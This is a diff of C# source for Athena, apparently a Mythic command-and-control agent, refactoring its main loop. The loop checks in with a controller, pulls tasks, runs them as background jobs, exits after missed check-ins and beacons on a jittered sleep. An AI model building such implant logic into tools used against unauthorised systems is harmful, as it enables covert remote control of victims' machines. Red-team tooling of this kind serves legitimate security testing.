@@ -41,21 +41,18 @@ namespace Athena
         /// <summary>
         /// Main Loop (Async)
         /// </summary>
-        /// <param name="args"></param>
-        /// <returns></returns>
         static async Task AsyncMain() 
         { 
             int maxMissedCheckins = 10;
             int missedCheckins = 0;
-            bool exit = false;
 
             //MythicClient controls all of the agent communications
-            MythicClient mc = new MythicClient();
+            AthenaClient ac = new AthenaClient();
 
             //First Checkin-In attempt
-            CheckinResponse res = await mc.handleCheckin();
+            CheckinResponse res = await ac.handleCheckin();
             
-            if (!await mc.updateAgentInfo(res))
+            if (!await ac.updateAgentInfo(res))
             {
                 Environment.Exit(0);
             }
@@ -68,38 +65,25 @@ namespace Athena
             {
                 try
                 {
-                    var delegateTask = mc.forwarder.GetMessages();
-                    var socksTask = mc.socksHandler.GetMessages();
-                    var responsesTask = mc.commandHandler.GetResponses();
-
-                    await Task.WhenAll(delegateTask, socksTask, responsesTask);
-
-                    List<DelegateMessage> delegateMessages = delegateTask.Result;
-                    List<SocksMessage> socksMessages = socksTask.Result;
-                    List<object> responses = responsesTask.Result;
-
-                    List<MythicTask> tasks = await mc.GetTasks(responses, delegateMessages, socksMessages);
-
-                    if (mc.exit)
+                    List<MythicTask> tasks = await ac.GetTasks();
+                    if (ac.exit)
                     {
                         Environment.Exit(0);
                     }
 
                     if(tasks is null)
                     {
+                        missedCheckins++;
                         if (missedCheckins == maxMissedCheckins)
                         {
                             Environment.Exit(0);
                         }
-                        //Return responses to waiting queue
-                        await mc.commandHandler.AddResponse(responses);
-                        missedCheckins++;
                     }
                     else
                     {
                         Parallel.ForEach(tasks, async c =>
                         {
-                            Task.Run(() => mc.commandHandler.StartJob(c));
+                            Task.Run(() => ac.commandHandler.StartJob(c));
                         });
                     }
                 }
@@ -111,7 +95,7 @@ namespace Athena
                         Environment.Exit(0);
                     }
                 }
-                await Task.Delay(await Misc.GetSleep(mc.MythicConfig.sleep, mc.MythicConfig.jitter) * 1000);
+                await Task.Delay(await Misc.GetSleep(ac.currentConfig.sleep, ac.currentConfig.jitter) * 1000);
             }
         }
     }
